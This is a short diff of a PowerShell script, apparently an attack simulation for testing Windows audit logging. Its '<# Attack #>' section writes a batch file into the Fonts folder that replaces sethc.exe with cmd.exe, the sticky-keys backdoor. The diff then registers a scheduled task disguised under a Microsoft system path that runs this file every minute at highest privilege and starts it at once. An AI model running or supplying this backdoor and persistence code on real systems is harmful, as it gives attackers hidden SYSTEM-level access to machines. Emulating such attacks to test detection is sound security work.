@@ -10,4 +10,7 @@ auditpol /set /subcategory:"Other Object Access Events" /success:enable /failure
 <# Attack #>
 echo "move c:\\Windows\\System32\\sethc.exe c:\\Windows\\System32\\chtes.old && del c:\\Windows\\System32\\sethc.exe && copy c:\\Windows\\System32\\cmd.exe c:\\Windows\\System32\\sethc.exe" >> c:\\Windows\\Fonts\\pepper.cmd
 
-SCHTASKS /CREATE /SC MINUTE /TN MICROSOFT\Windows\WCM\Nettask /TR C:\Windows\Fonts\pepper.cmd /RL HIGHEST
+$Time = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1)
+$Action = New-ScheduledTaskAction -Execute "C:\Windows\Fonts\pepper.cmd"
+Register-ScheduledTask -TaskName "Nettask" -TaskPath "\Microsoft\Windows\WCM\" -Trigger $Time -Action $Action -Runlevel Highest
+Get-ScheduledTask -TaskPath "\Microsoft\Windows\WCM\" | Start-ScheduledTask
